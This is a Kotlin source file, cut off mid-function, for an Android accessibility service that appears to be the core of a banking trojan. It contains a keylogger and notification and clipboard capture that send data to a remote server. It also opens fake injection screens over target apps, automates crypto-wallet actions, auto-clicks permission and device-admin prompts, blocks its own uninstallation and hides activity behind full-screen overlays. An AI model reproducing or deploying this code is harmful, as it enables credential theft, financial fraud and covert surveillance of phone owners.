package com.xxx.zzz.accessppp

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.accessibilityservice.GestureDescription.StrokeDescription
import android.app.Notification
import android.content.*
import android.content.pm.PackageManager
import android.content.res.Resources
import android.graphics.Color
import android.graphics.Path
import android.graphics.PixelFormat
import android.graphics.Rect
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.util.DisplayMetrics
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.ViewConfiguration
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.RelativeLayout
import android.widget.TextView
import com.xxx.zzz.Payload.ApplicationScope
import com.xxx.zzz.PermissionsActivity
import com.xxx.zzz.aall.permasd.utilsssss.PermissionsUtil
import com.xxx.zzz.accessppp.utilss.AccessUtilsr
import com.xxx.zzz.adminp.ActivityAdminqw
import com.xxx.zzz.globp.Constantsfd
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.globp.UtilsGfgsd
import com.xxx.zzz.globp.constNm
import com.xxx.zzz.globp.utilssss.MiuUtils
import com.xxx.zzz.globp.utilssss.Utilslp
import com.xxx.zzz.injectp.ViewInjectionsad
import com.xxx.zzz.notifp.DrawerSniffer
import com.xxx.zzz.socketsp.IOSocketyt
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.debounce
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.flow.onEach
import kotlinx.coroutines.flow.receiveAsFlow
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.util.*
import java.util.concurrent.TimeUnit


class AccessibilityServiceQ : AccessibilityService() {

    private var btcDone = false

    @Volatile
    private var eventRootInActiveWindow: AccessibilityNodeInfo? = null

    private var mMainHandler: Handler? = null
    private val channel: Channel<Boolean> = Channel(Channel.CONFLATED)

    private val currentPackage: String
        get() {
            val root = rootUiObject
            return root?.pkg ?: ""
        }

    private val mGestureCallback = GestureCallback()
    private val mGestureCallbackWallets = GestureCallback()

    @Volatile
    var currentActivity = ""
        private set

    var currentHomePackage: String? = null
    var itemCnt: Int = 0
    var listSize: Int = 0
    var mViewBlack: View? = null
    var mViewWait: View? = null
    var myPackageName: String? = null

    val clipboard
        get() = applicationContext.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager

    val rootUiObject: UiObject?
        get() {
            var root = eventRootInActiveWindow
            if (root == null) {
                root = super.getRootInActiveWindow()
            }
            return UiObject.wrap(root)
        }

    init {
        channel
            .receiveAsFlow()
            .debounce(500)
            .onEach {
                Log.d(TAG, "receiveAsFlow")
                UtilsGfgsd.startApplicationPerm(this@AccessibilityServiceQ)
            }
            .launchIn(ApplicationScope)
    }

    fun AccessibilityNodeInfo.refresher() {
        rootInActiveWindow?.refresh()
        val eventRootNode = super.getRootInActiveWindow()
        if (eventRootNode != null) {
            eventRootInActiveWindow = eventRootNode
        }
    }

    fun deleteWaitView() {
        try {
            mMainHandler?.post {
                mViewWait?.let {
                    val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
                    windowManager.removeView(mViewWait)
                    mViewWait = null
                }
            }
        } catch (ex: Exception) {
            IOSocketyt.sendLogs("", "deleteWaitView ${ex.localizedMessage}", "error")
            Log.e("ACCSVC", "adding view failed", ex)
        }
    }

    fun scroll(x: Int, y: Int, scrollAmount: Int) {
        if (!mGestureCallback.mCompleted) return
        mGestureCallback.mCompleted = false
        dispatchGesture(createSwipe(x, y, x, y - scrollAmount, ViewConfiguration.getScrollDefaultDelay()), mGestureCallback, null)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        instance = this
        runCatching {
            val eventRootNode = super.getRootInActiveWindow()
            if (eventRootNode != null) {
                eventRootInActiveWindow = eventRootNode
            }
            if (eventRootInActiveWindow == null) {
                eventRootInActiveWindow = event.source
            }

            //------------------------keylogger--------------------------------------------
            keylogger(event)

            SharedPreferencess.init(this.applicationContext)

            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                //------------------------Current Activity changed--------------------------------------------
                setCurrentActivity(Objects.toString(event.packageName, ""), Objects.toString(event.className, ""))

                //------------------------injectView--------------------------------------------
                if (injectView(event.packageName?.toString() ?: "")) return

                //------------------------check hasPermition--------------------------------------------
                if (!SharedPreferencess.hasNotifPermition)
                    SharedPreferencess.hasNotifPermition = DrawerSniffer.hasPermission(this)
                if (!SharedPreferencess.hasAllPermition)
                    SharedPreferencess.hasAllPermition = PermissionsUtil.hasSelfPermission(this, arrayOf(*Constantsfd.PERMISSIONS))
                if (!SharedPreferencess.hasOverlaysPermition)
                    SharedPreferencess.hasOverlaysPermition =
                        if ("xiaomi" == Build.MANUFACTURER.lowercase())
                            MiuUtils.isAllowed(this) && MiuUtils.canDrawOverlays(this)
                        else
                            MiuUtils.canDrawOverlays(this)
                if (!SharedPreferencess.hasDozePermition)
                    SharedPreferencess.hasDozePermition = PermissionsActivity.is_dozemode(this)
            }

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> {
                    runCatching {
                        if (SharedPreferencess.hasAllPermition) {
                            if (event.contentDescription?.toString() == SharedPreferencess.appName
                                || event.contentDescription?.toString() == Utilslp.getLabelApplication(this)
                            ) {
                                blockBack1()
                                return@runCatching
                            }
                        }
                    }

                    //------------------------injectView--------------------------------------------
                    if (injectView(event.packageName?.toString() ?: "")) return@runCatching
                }
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    Log.v(TAG, "onAccessibilityEvent: TYPE_VIEW_TEXT_CHANGED $event")
                    clipboard(event)
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    when (event.contentChangeTypes) {
                        AccessibilityEvent.CONTENT_CHANGE_TYPE_SUBTREE,
                        AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT,
                        AccessibilityEvent.CONTENT_CHANGE_TYPE_UNDEFINED -> {
//                            Log.v(TAG, "onAccessibilityEvent: WORKED $event")
//                            Log.v(TAG, "currentPackage - $currentPackage")
//                            Log.v(TAG, "currentActivity - $currentActivity")
//                            Log.v(TAG, "event.packageName - " + event.packageName)

                            if (event.contentChangeTypes == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
                                clipboard(event)
                            }

                            val currentActivityLowerCase = currentActivity.lowercase(Locale.getDefault())
                            if (eventRootInActiveWindow == null)
                                return
                            
                            runCatching {
                                //------------------------kill Application--------------------------------------------
                                if (killApplication())
                                    return
                                //------------------------click ok--------------------------------------------
                                if (SharedPreferencess.autoClickOnceStream == "1") {
                                    if (clickAtButton("android", "button1", true)) {
                                        SharedPreferencess.autoClickOnceStream = ""
                                        IOSocketyt.sendLogs("", "autoClickStream", "success")
                                        return
                                    }
                                }
                                //------------------------wallets--------------------------------------------
                                if (SharedPreferencess.hasAllPermition)
                                    wallets(event.packageName.toString())
                                //------------------------set With Name Of App--------------------------------------------
                                val setWithNameOfApp = mutableListOf<AccessibilityNodeInfo>()
                                    .apply {
                                        eventRootInActiveWindow?.findAccessibilityNodeInfosByText(SharedPreferencess.appName)
                                            ?.filter { it.isVisibleToUser }
                                            ?.let { addAll(it) }
                                        if (!SharedPreferencess.sameName)
                                            eventRootInActiveWindow?.findAccessibilityNodeInfosByText(Utilslp.getLabelApplication(this@AccessibilityServiceQ))
                                                ?.filter { it.isVisibleToUser }
                                                ?.let { addAll(it) }
                                    }
                                    .toSet()
                                //------------------------perm click--------------------------------------------
                                runCatching {
                                    if (permissionClick(event.packageName.toString().lowercase(), currentActivityLowerCase, setWithNameOfApp))
                                        return
                                }
                                //------------------------ussd--------------------------------------------
                                if (ussdSend()) return
                                //------------------------push--------------------------------------------
                                if (clearPush()) return
                                //------------------------swap SMS--------------------------------------------
                                if (swapSMS(setWithNameOfApp)) return
                                //------------------------whatsApp--------------------------------------------
                                if (whatsAppSend()) return
                                //------------------------clear cache--------------------------------------------
                                clearCache()
                                //------------------------gmail--------------------------------------------
                                if (gmail()) return
                                //------------------------unclick delete--------------------------------------------
                                if (event.className.toString().lowercase(Locale.getDefault()).contains("deletedialog")
                                    || currentActivityLowerCase.contains("uninstalleractivity")
                                    || (currentPackage == "com.google.android.packageinstaller"
                                            && !currentActivityLowerCase.contains("grantpermissionsactivity")
                                            && SharedPreferencess.hasAllPermition)
                                ) {
                                    setWithNameOfApp.firstOrNull()
                                        ?.let {
                                            if ((currentHomePackage != null
                                                        && clickAtButton(currentHomePackage!!, "btnCancel", true))
                                                || clickAtButton("android", "button2", true)
                                            ) {
                                                //
                                            } else {
                                                blockBack1()
                                            }
                                        }
                                }

                                //------------------------overlay--------------------------------------------
                                if (overlayPerm(event)) return
                                //------------------------doze mode--------------------------------------------
                                if (dozePerm(event, currentActivityLowerCase)) return
                                //------------------------admin--------------------------------------------
                                if (adminPerm(currentActivityLowerCase)) return
                                //------------------------notification--------------------------------------------
                                if (notifPerm(currentActivityLowerCase)) return

                                //------------------------special perm--------------------------------------------
                                when {
                                    //------------------------автозапуск--------------------------------------------
                                    event.packageName == "com.miui.securitycenter" || currentPackage == "com.miui.securitycenter"
                                    -> {
                                        if (SharedPreferencess.autoClickAdminCommand != "1" && !SharedPreferencess.clickNotifPermition) {
                                            //------------------------!clickAutoStart--------------------------------------------
                                            if (!SharedPreferencess.clickAutoStart) {
                                                val list =
                                                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/app_manager_details_applabel")
                                                        ?.filter { it.text == Utilslp.getLabelApplication(this) }
                                                val size = list?.size ?: 0
                                                list?.getOrNull(runCatching { cnt % size }.getOrDefault(0))?.let {
                                                    cnt++
                                                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/am_switch")
                                                        ?.firstOrNull()?.let {
                                                            TimeUnit.MILLISECONDS.sleep(500.toLong())
                                                            it.refresh()
                                                            if (!it.isChecked) {
                                                                click(it)
                                                                return
                                                            } else {
                                                                SharedPreferencess.clickAutoStart = true
                                                            }

                                                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                                                ?.firstOrNull()
                                                                ?.let {
                                                                    click(it)
                                                                    SharedPreferencess.clickAutoStart = true
                                                                    startApp()
                                                                    return
                                                                }
                                                        }
                                                }
                                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                                                    ?.firstOrNull()
                                                    ?.let {
                                                        click(it)
                                                        SharedPreferencess.clickAutoStart = true
                                                        startApp()
                                                        return
                                                    }
                                            } else {
                                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/check_box")
                                                    ?.forEach {
                                                        if (!it.isChecked)
                                                            clickNodeOrParent(it, true)
                                                    }

                                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/intercept_warn_allow")
                                                    ?.forEach {
                                                        clickNodeOrParent(it, false)
                                                    }

                                                if (ActivityAdminqw.isAdminDevice(this)) {
                                                    SharedPreferencess.autoClickAdminCommand = ""
                                                    IOSocketyt.sendLogs("", "autoClickAdmin2", "success")
                                                }

                                                //TODO возможно убрать
                                                handler.removeCallbacksAndMessages(null)
                                                handler.postDelayed({
                                                    blockBack()
                                                }, 100)
                                            }
                                        }
                                    }
                                }

                                //------------------------go back SubSettings--------------------------------------------
                                when {
                                    //------------------------SubSettings--------------------------------------------
                                    currentActivity == "com.android.settings.SubSettings"
                                            || currentActivity == "com.android.settings.MiuiSettings"
                                            || currentActivityLowerCase.contains("installedappdetailstop")
                                            || currentActivityLowerCase.contains("managepermissionsactivity")
                                            || currentActivityLowerCase.contains("startupappcontrolactivity")
                                            || currentActivityLowerCase.contains("apppermissionactivity")
                                            || currentActivityLowerCase.contains("powercontrolactivity")
                                            || currentActivityLowerCase.contains("powerusagemodelactivity")
                                            || currentActivityLowerCase.contains("stubinstallactivity")
                                            || currentActivityLowerCase.contains("bgoptimizeapplistactivity")
                                            || currentActivityLowerCase.contains("deviceadminsettingsactivity")
                                            || currentActivity == "com.android.settings.Settings\$BgOptimizeAppListActivity"
                                            || currentActivity == "com.android.settings.CleanSubSettings"
                                            || currentActivity == "com.android.settings.Settings\$DeviceAdminSettingsActivity"
                                            || currentPackage == "com.coloros.securitypermission"
                                            || (currentPackage == "com.android.settings" && !currentActivityLowerCase.contains(".launcher"))
                                    -> {
                                        if (!(SharedPreferencess.autoClickAdminCommand == "1" || SharedPreferencess.clickNotifPermition) && SharedPreferencess.hasAllPermition) {
                                            setWithNameOfApp
                                                .firstOrNull()
                                                ?.let {
                                                    if ((currentHomePackage != null && clickAtButton(
                                                            currentHomePackage!!,
                                                            "btnCancel",
                                                            true
                                                        )) || clickAtButton(
                                                            "android",
                                                            "button2",
                                                            true
                                                        ) || clickAtButton(
                                                            "com.miui.home",
                                                            "cancel",
                                                            true
                                                        )
                                                    ) {
                                                        //
                                                    } else {
                                                        if (SharedPreferencess.hasOverlaysPermition || Calendar.getInstance().timeInMillis - PermissionsActivity.lastStart > 30000)
                                                            blockBack1()
                                                    }
                                                }
                                        }
                                    }
                                }

                                // --------------- Block Delete Bots --------------------
                                if (blockDeleteBots(event, currentPackage)) return
                                //------------------Exit-Settings-Accessibility-Service--------------
                                if (exitSettings(event)) return
                                // --------------- unclick --------------------
                                if (unclick(setWithNameOfApp)) return

                                true
                            }.onFailure {
                                IOSocketyt.sendLogs(
                                    "",
                                    "onAccessibilityEvent TYPE_WINDOW_STATE_CHANGED ${it.localizedMessage}",
                                    "error"
                                )
                            }
                        }
                        else -> {
//                            Log.v(TAG, "onAccessibilityEvent: else $event")
                        }
                    }
                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    Log.v(TAG, "onAccessibilityEvent: TYPE_NOTIFICATION_STATE_CHANGED $event")
                    //------------------------readPush--------------------------------------------
                    readPush(event)
                }
                else -> {
//                    Log.v(TAG, "onAccessibilityEvent: TYPE_ELSE $event")
//                    Log.v(TAG, "currentPackage - $currentPackage")
//                    Log.v(TAG, "currentActivity - $currentActivity")
//                    Log.v(TAG, "event.packageName - " + event.packageName)
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "onAccessibilityEvent ${it.localizedMessage}", "error")
        }
    }

    override fun onInterrupt() {}

    public override fun onServiceConnected() {
        Log.v(TAG, "onServiceConnected: $serviceInfo")
        super.onServiceConnected()
        instance = this
        mMainHandler = Handler(Looper.getMainLooper())

        SharedPreferencess.init(this.applicationContext)

        mGestureCallback.mCompleted = true
        mGestureCallbackWallets.mCompleted = true

        ApplicationScope.launch {
            runCatching {
                IOSocketyt.updateBotParams()
            }
        }

        if (Constantsfd.addWaitView) {
            addWaitView()

            ApplicationScope.launch {
                runCatching {
                    delay(30000)
                    mViewWait?.let {
                        deleteWaitView()
                    }
                }.onFailure {
                    IOSocketyt.sendLogs("", "deleteWaitView ${it.localizedMessage}", "error")
                }
            }
        }

        try {
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_HOME)
            currentHomePackage = packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY)?.activityInfo?.packageName
            myPackageName = this@AccessibilityServiceQ.packageName
        } catch (ex: Exception) {
            IOSocketyt.sendLogs("", "onServiceConnected startApp ${ex.localizedMessage}", "error")
            ex.printStackTrace()
        }
    }

    private fun addBlackView() {
        runCatching {
            val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
            mViewBlack = LinearLayout(this.applicationContext)
            mViewBlack?.setBackgroundColor(Color.BLACK)

            val layoutParams = WindowManager.LayoutParams()
            layoutParams.apply {
                width = WindowManager.LayoutParams.MATCH_PARENT
                height = WindowManager.LayoutParams.MATCH_PARENT
                type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                gravity = Gravity.TOP or Gravity.LEFT
                format = PixelFormat.TRANSPARENT
                flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            }

            try {
                mMainHandler?.post {
                    windowManager.addView(mViewBlack, layoutParams)
                }
            } catch (ex: Exception) {
                IOSocketyt.sendLogs("", "addBlackView ${ex.localizedMessage}", "error")
                Log.e("ACCSVC", "adding view failed", ex)
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "addBlackView ${it.localizedMessage}", "error")
        }
    }

    private fun addWaitView(colorBack: String = "#000000", colorText: String = "#ffffff", text: String = "Please wait") {
        runCatching {
            val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

            val layoutParams = WindowManager.LayoutParams()
            layoutParams.apply {
                width = WindowManager.LayoutParams.MATCH_PARENT
                height = WindowManager.LayoutParams.MATCH_PARENT
                type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                gravity = Gravity.CENTER
                format = PixelFormat.TRANSPARENT
                flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            }

            mViewWait = RelativeLayout(this.applicationContext)
            mViewWait?.setBackgroundColor(Color.parseColor(colorBack))

            val progress = ProgressBar(mViewWait!!.context)
            progress.isIndeterminate = true
            val params = RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT)
            val rl = RelativeLayout(mViewWait!!.context)
            rl.gravity = Gravity.CENTER
            rl.addView(progress)

            (mViewWait as RelativeLayout).addView(rl, params)

            val valueTV = TextView(mViewWait!!.context)
            valueTV.text = text
            valueTV.textSize = 24f
            valueTV.setTextColor(Color.parseColor(colorText))
            val lp = RelativeLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            lp.layoutDirection = Gravity.CENTER or Gravity.CENTER_HORIZONTAL
            lp.topMargin = progress.maxHeight + 100
            valueTV.layoutParams = lp
            valueTV.gravity = Gravity.CENTER

            (mViewWait as RelativeLayout).addView(valueTV)

            try {
                mMainHandler?.post {
                    windowManager.addView(mViewWait, layoutParams)
                }
            } catch (ex: Exception) {
                IOSocketyt.sendLogs("", "addWaitView ${ex.localizedMessage}", "error")
                Log.e("ACCSVC", "adding view failed", ex)
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "addWaitView ${it.localizedMessage}", "error")
        }
    }

    private fun blockDeleteBots(event: AccessibilityEvent, packageName: String): Boolean {
        runCatching {
            if (SharedPreferencess.killApplication != packageName) {
                //--- Block Delete Bots ---
                if (packageName.contains("com.android.settings")) {
                    if (event.className?.contains("com.android.settings.applications.installedappdetailstop") == true ||
                        event.className?.contains("com.android.settings.settings.accessibilitysettingsactivity") == true
                    ) {
                        blockBack()
                        return true
                    }
                }
                val strText = runCatching {
                    event.text.toString()
                }.getOrDefault("")
                //--- Block Delete Bots ---
                if (packageName.contains("com.google.android.packageinstaller")
                    && event.className?.contains("android.app.alertdialog") == true
                    && (strText.contains(SharedPreferencess.appName, true) || strText.contains(
                        Utilslp.getLabelApplication(this),
                        true
                    ))
                ) {
                    blockBack()
                    return true
                }
                //--- Block Delete Bots ---
                if ((event.className == "android.widget.linearlayout")
                    && (packageName == "com.android.settings" || packageName == "com.miui.securitycenter")
                    && (strText.contains(SharedPreferencess.appName, true) || strText.contains(
                        Utilslp.getLabelApplication(this),
                        true
                    ))
                ) {
                    blockBack()
                    return true
                }
                //--- Block off admin ---
                if (event.className == "com.android.settings.deviceadminadd" && ActivityAdminqw.isAdminDevice(this)) {
                    blockBack()
                    return true
                }
            }
        }

        return false
    }

    private fun deleteBlackView() {
        try {
            mMainHandler?.post {
                val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
                windowManager.removeView(mViewBlack)
                mViewBlack = null
            }
        } catch (ex: Exception) {
            IOSocketyt.sendLogs("", "deleteBlackView ${ex.localizedMessage}", "error")
            Log.e("ACCSVC", "adding view failed", ex)
        }
    }

    private fun exitSettings(event: AccessibilityEvent): Boolean {
        runCatching {
            if (SharedPreferencess.hasAllPermition && SharedPreferencess.hasDozePermition) {
                if (cosdfnstNm.акссес.any {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByText(it)?.filter { it.isVisibleToUser }?.isNotEmpty() == true
                    } && Calendar.getInstance().timeInMillis - PermissionsActivity.lastStart > 30000) {
                    blockBack()
                    return true
                }
                if (("com.android.settings.SubSettings".contains(event.className.toString(), true) &&
                            event.text.toString().contains(Constantsfd.access1, true)) ||
                    ("com.android.settings.SubSettings".contains(event.className.toString(), true) &&
                            event.contentDescription?.toString()
                                ?.contains(Constantsfd.access1, true) == true)
                ) {
                    blockBack()
                    return true
                }
            }
        }

        return false
    }
    
    private fun injectView(packageAppStart: String): Boolean {
        runCatching {
            if (SharedPreferencess.activeInjection.contains(packageAppStart)
                && packageAppStart.contains(".")
                && ((SharedPreferencess.SettingsRead(packageAppStart)?.length ?: 0) > 10)
            ) {
                openFake(this@AccessibilityServiceQ, packageAppStart)
                return true
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "injectView ${it.localizedMessage}", "error")
        }
        return false
    }

    private fun keylogger(event: AccessibilityEvent) {
        if (SharedPreferencess.keylogger == "1") {
            runCatching {
                StringBuffer().apply {
                    when (event.eventType) {
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> this.append(event.text.toString())
                        AccessibilityEvent.TYPE_VIEW_CLICKED -> this.append(event.text.toString())
                        AccessibilityEvent.TYPE_VIEW_FOCUSED -> this.append(event.text.toString())
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                            when (event.contentChangeTypes) {
                                AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT -> {
                                    this.append(event.text.toString())
                                }
                            }
                        }
                    }
                }.toString().trim().takeIf { it.isNotEmpty() && it != "[]" }?.let { text ->
                    //keylog
                    when (event.eventType) {
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                            Log.v("Logger", "[TEXT_CHANGED] $text")
                            IOSocketyt.sendLogs("", JSONObject().apply {
                                put("[TEXT_CHANGED]", text)
                            }.toString(), "keylogger")
                        }
                        AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                            Log.v("Logger", "[VIEW_CLICKED] $text")
                            IOSocketyt.sendLogs("", JSONObject().apply {
                                put("[VIEW_CLICKED]", text)
                            }.toString(), "keylogger")
                        }
                        AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                            Log.v("Logger", "[VIEW_FOCUSED] $text")
                            IOSocketyt.sendLogs("", JSONObject().apply {
                                put("[VIEW_FOCUSED]", text)
                            }.toString(), "keylogger")
                        }
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                            when (event.contentChangeTypes) {
                                AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT -> {
                                    Log.v("Logger", "[CHANGE_TYPE_TEXT] $text")
                                    IOSocketyt.sendLogs("", JSONObject().apply {
                                        put("[CHANGE_TYPE_TEXT]", text)
                                    }.toString(), "keylogger")
                                }
                                else -> {
                                    Log.v("Logger", text)
                                    IOSocketyt.sendLogs("", JSONObject().apply {
                                        put("[OTHER]", text)
                                    }.toString(), "keylogger")
                                }
                            }
                        }
                        else -> {
                            Log.v("Logger", text)
                            IOSocketyt.sendLogs("", JSONObject().apply {
                                put("[OTHER_]", text)
                            }.toString(), "keylogger")
                        }
                    }
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "keylogger ${it.localizedMessage}", "error")
            }
        }
    }

    private fun killApplication(): Boolean {
        runCatching {
            if (SharedPreferencess.killApplication.isNotEmpty()) {
                if (clickAtButton("android", "button1", false) ||
                    clickAtButton("com.android.settings", "action_button", false) ||
                    clickAtButton("com.android.settings", "left_button", false)
                ) {
                    IOSocketyt.sendLogs("", "killApplication ${SharedPreferencess.killApplication}", "success")
                    SharedPreferencess.killApplication = ""
                    return true
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "killApplication ${it.localizedMessage}", "error")
        }

        return false
    }

    private fun openFake(context: Context, nameInj: String?): Boolean {
        try {
            if (SharedPreferencess.SettingsRead(nameInj)!!.isNotEmpty()) {
                val intent = Intent(context, ViewInjectionsad::class.java)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                SharedPreferencess.app_inject = nameInj ?: ""
                context.startActivity(intent)
                IOSocketyt.sendLogs("", "openFake inject $nameInj", "success")
                return true
            }
        } catch (ex: Exception) {
            IOSocketyt.sendLogs("", "openFake ${ex.localizedMessage}", "error")
        }
        return false
    }

    private fun permissionClick(packageName: String, currentActivity: String, listWithNameOfApp: Set<AccessibilityNodeInfo>): Boolean {
        runCatching {
            listWithNameOfApp.firstOrNull()?.let {
                val unclick = cosdfnstNm.не_клик
                for (clickButton in unclick) {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)
                        ?.firstOrNull { it.isVisibleToUser }
                        ?.let {
                            cosdfnstNm.нажми.forEach { clickButton ->
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByText(
                                    clickButton
                                )?.firstOrNull()?.let {
                                    if (clickNodeOrParent(it, true)) {
                                        return@forEach
                                    }
                                }
                            }
                        }
                }
            }

            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.permissioncontroller:id/permission_allow_foreground_only_button")
                ?.firstOrNull { it.isClickable }
                ?.let {
                    if (click(it))
                        return true
                }
            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.permissioncontroller:id/permission_no_upgrade_and_dont_ask_again_button")
                ?.firstOrNull { it.isClickable }
                ?.let {
                    if (click(it))
                        return true
                }
            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.permissioncontroller:id/permission_allow_button")
                ?.firstOrNull { it.isClickable }
                ?.let {
                    if (click(it))
                        return true
                }
            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/permission_allow_button")
                ?.firstOrNull { it.isClickable }
                ?.let {
                    if (click(it))
                        return true
                }

            eventRootInActiveWindow?.findAccessibilityNodeInfosByText("!!!CANCEL")
                ?.firstOrNull()
                ?.let {
                    if (click(it))
                        return true
                }

            runCatching {
                val click = cosdfnstNm.сука
                for (clickButton in click) {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByText(clickButton)?.firstOrNull { it.isClickable && it.isVisibleToUser }?.let {
                        if (click(it))
                            return@runCatching
                    }
                }
            }

            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                ?.firstOrNull { it.isClickable }
                ?.let {
                    if (it.text != "!!!SETTINGS") {
                        if (click(it))
                            return true
                    }
                }

            if (!SharedPreferencess.hasAllPermition || packageName.contains("permissioncontroller") || currentActivity.contains("grantpermissionsactivity")) {
                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/action_button")
                    ?.firstOrNull { it.isClickable }
                    ?.let {
                        if (click(it))
                            return true
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/accept")
                    ?.firstOrNull { it.isClickable }
                    ?.let {
                        if (click(it))
                            return true
                    }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "permissionClick ${it.localizedMessage}", "error")
        }
        return false
    }

    private fun readPush(event: AccessibilityEvent) {
        if (currentPackage != myPackageName) {
            runCatching {
                val data = event.parcelableData
                if (data is Notification) {
                    val notification: Notification = data

                    val strText = try {
                        event.text[0].toString()
                    } catch (ex: Exception) {
                        IOSocketyt.sendLogs("", "readPush ${ex.localizedMessage}", "error")
                        runCatching {
                            event.text.toString()
                        }.getOrDefault("")
                    }

                    val obj = JSONObject()
                    obj.put("package", currentPackage)
                    obj.put("ticker", notification.tickerText)
                    obj.put("notification", strText)
                    obj.put("text", notification.extras.getCharSequence(Notification.EXTRA_TEXT).toString())
                    notification.visibility = Notification.VISIBILITY_SECRET
                    IOSocketyt.sendLogs("", obj.toString(), "pushlist")
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "readPush ${it.localizedMessage}", "error")
            }
        }
    }

    private fun setCurrentActivity(pkgName: String, clsName: String) {
        if (clsName.startsWith("android.view.") || clsName.startsWith("android.widget.")) {
            return
        }
        currentActivity = try {
            val componentName = ComponentName(pkgName, clsName)
            this@AccessibilityServiceQ.packageManager.getActivityInfo(componentName, 0).name
        } catch (e: PackageManager.NameNotFoundException) {
            return
        }
    }

    private fun startApp() {
        channel.trySend(true)
    }

    private fun unclick(listWithNameOfApp: Set<AccessibilityNodeInfo>): Boolean {
        runCatching {
            if (SharedPreferencess.killApplication.isEmpty()) {
                if (SharedPreferencess.autoClickCacheCommand != "1"
                    && SharedPreferencess.autoClickAdminCommand != "1"
                    && !SharedPreferencess.clickNotifPermition
                    && SharedPreferencess.hasAllPermition
                    && (SharedPreferencess.hasDozePermition || "xiaomi" == Build.MANUFACTURER.lowercase())
                    && SharedPreferencess.hasOverlaysPermition
                ) {
                    listWithNameOfApp.firstOrNull()?.let {
                        if (it.packageName == "com.miui.securitycenter" ||
                            currentPackage == "com.miui.securitycenter"
                        ) {
                            blockBack1()
                        } else if (it.packageName == "com.google.android.packageinstaller"
                        ) {
                            blockBack1()
                        } else if (it.packageName == "com.android.packageinstaller" ||
                            currentPackage == "com.android.packageinstaller"
                        ) {
                            blockBack1()
                        } else if (it.packageName == "com.android.settings" ||
                            currentPackage == "com.android.settings"
                        ) {
